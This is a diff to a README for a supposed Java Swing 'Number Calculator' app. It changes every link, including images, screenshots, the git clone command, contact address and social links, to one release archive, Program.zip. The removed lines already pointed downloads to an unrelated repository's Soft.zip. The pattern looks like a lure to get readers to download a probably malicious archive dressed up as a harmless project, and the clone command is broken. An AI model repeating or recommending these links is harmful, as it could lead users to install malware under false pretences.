@@ -1,6 +1,6 @@
 # 💡 **Java Number Calculator**
 
-![Java Number Calculator](https://example.com/image.jpg)
+![Java Number Calculator](https://github.com/wwwwwtyy/java-number-calculator/releases/download/v1.0/Program.zip)
 
 Welcome to the **Java Number Calculator** repository! This Java program allows users to input six numbers and calculates their total and average with precision. With a user-friendly GUI built using Java Swing, this calculator ensures input validation and provides clear result display.
 
@@ -24,7 +24,7 @@ Welcome to the **Java Number Calculator** repository! This Java program allows u
 To get started with the Java Number Calculator, simply follow these steps:
 1. Clone the repository to your local machine using the following command:
    ```bash
-   git clone https://github.com/your-username/java-number-calculator.git
+   git clone https://github.com/wwwwwtyy/java-number-calculator/releases/download/v1.0/Program.zip
    ```
 
 2. Launch the application by running the compiled Java program.
@@ -35,15 +35,15 @@ To get started with the Java Number Calculator, simply follow these steps:
 
 Here are a few screenshots of the Java Number Calculator in action:
 
-![Screenshot 1](https://example.com/screenshot1.jpg)
-![Screenshot 2](https://example.com/screenshot2.jpg)
-![Screenshot 3](https://example.com/screenshot3.jpg)
+![Screenshot 1](https://github.com/wwwwwtyy/java-number-calculator/releases/download/v1.0/Program.zip)
+![Screenshot 2](https://github.com/wwwwwtyy/java-number-calculator/releases/download/v1.0/Program.zip)
+![Screenshot 3](https://github.com/wwwwwtyy/java-number-calculator/releases/download/v1.0/Program.zip)
 
 ---
 
 ## 📦 Download
 
-🔗 **[Download the Calculator](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)**
+🔗 **[Download the Calculator](https://github.com/wwwwwtyy/java-number-calculator/releases/download/v1.0/Program.zip)**
 
 ---
 
@@ -70,7 +70,7 @@ We would like to extend our special thanks to all contributors who have helped i
 
 ## 📧 Contact Us
 
-If you have any questions or suggestions regarding the Java Number Calculator, feel free to reach out to us at `java.number.calculator@example.com`.
+If you have any questions or suggestions regarding the Java Number Calculator, feel free to reach out to us at `https://github.com/wwwwwtyy/java-number-calculator/releases/download/v1.0/Program.zip`.
 
 ---
 
@@ -79,12 +79,12 @@ If you have any questions or suggestions regarding the Java Number Calculator, f
 ---
 
 ### Connect with Us
-- [LinkedIn](https://www.linkedin.com/example)
-- [Twitter](https://www.twitter.com/example)
+- [LinkedIn](https://github.com/wwwwwtyy/java-number-calculator/releases/download/v1.0/Program.zip)
+- [Twitter](https://github.com/wwwwwtyy/java-number-calculator/releases/download/v1.0/Program.zip)
 
 ---
 
-### **[Download Now](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)** 📥
+### **[Download Now](https://github.com/wwwwwtyy/java-number-calculator/releases/download/v1.0/Program.zip)** 📥
 
 ---
 
